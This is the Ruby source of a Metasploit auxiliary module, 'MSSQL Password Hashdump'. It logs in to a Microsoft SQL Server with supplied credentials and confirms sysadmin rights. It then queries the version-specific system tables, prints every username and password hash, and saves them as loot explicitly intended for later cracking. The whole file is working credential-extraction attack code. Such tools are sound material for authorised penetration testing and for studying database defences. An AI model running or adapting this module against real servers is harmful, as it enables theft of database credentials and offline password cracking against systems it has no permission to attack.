##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::MSSQL
  include Msf::Auxiliary::Report

  include Msf::Auxiliary::Scanner

  def initialize(info={})
    super(
        update_info(
            info,
            'Name'           => 'MSSQL Password Hashdump',
            'Description'    => %Q{
              This module extracts the usernames and encrypted password
              hashes from a MSSQL server and stores them for later cracking.
              This module also saves information about the server version and
              table names, which can be used to seed the wordlist.
            },
            'Author'         => ['theLightCosine'],
            'License'        => MSF_LICENSE
        )
    )
  end

  def run_host(ip)

    if (not mssql_login_datastore)
      print_error("#{rhost}:#{rport} - Invalid SQL Server credentials")
      return
    end

    #Grabs the Instance Name and Version of MSSQL(2k,2k5,2k8)
    instancename= mssql_query(mssql_enumerate_servername())[:rows][0][0].split('\\')[1]
    print_status("Instance Name: #{instancename.inspect}")
    version = mssql_query(mssql_sql_info())[:rows][0][0]
    version_year = version.split('-')[0].slice(/\d\d\d\d/)

    mssql_hashes = mssql_hashdump(version_year)
    unless mssql_hashes.nil?
      report_hashes(mssql_hashes,version_year)
    end

  end


  #Stores the grabbed hashes as loot for later cracking
  #The hash format is slightly different between 2k and 2k5/2k8
  def report_hashes(mssql_hashes, version_year)

    case version_year
    when "2000"
      hashtype = "mssql.hashes"

    when "2005", "2008"
      hashtype = "mssql05.hashes"
    end

    this_service = report_service(
          :host  => datastore['RHOST'],
          :port => datastore['RPORT'],
          :name => 'mssql',
          :proto => 'tcp'
          )

    tbl = Rex::Ui::Text::Table.new(
      'Header'  => 'MS SQL Server Hashes',
      'Indent'   => 1,
      'Columns' => ['Username', 'Hash']
    )

    hash_loot=""
    mssql_hashes.each do |row|
      next if row[0].nil? or row[1].nil?
      next if row[0].empty? or row[1].empty?
      tbl << [row[0], row[1]]
      print_good("#{rhost}:#{rport} - Saving #{hashtype} = #{row[0]}:#{row[1]}")
    end
    filename= "#{datastore['RHOST']}-#{datastore['RPORT']}_sqlhashes.txt"
    store_loot(hashtype, "text/plain", datastore['RHOST'], tbl.to_csv, filename, "MS SQL Hashes", this_service)
  end

  #Grabs the user tables depending on what Version of MSSQL
  #The queries are different between 2k and 2k/2k8
  def mssql_hashdump(version_year)
    is_sysadmin = mssql_query(mssql_is_sysadmin())[:rows][0][0]

    if is_sysadmin == 0
      print_error("#{rhost}:#{rport} - The provided credentials do not have privileges to read the password hashes")
      return nil
    end

    case version_year
    when "2000"
      results = mssql_query(mssql_2k_password_hashes())[:rows]

    when "2005", "2008"
      results = mssql_query(mssql_2k5_password_hashes())[:rows]
    end

    return results

  end


end
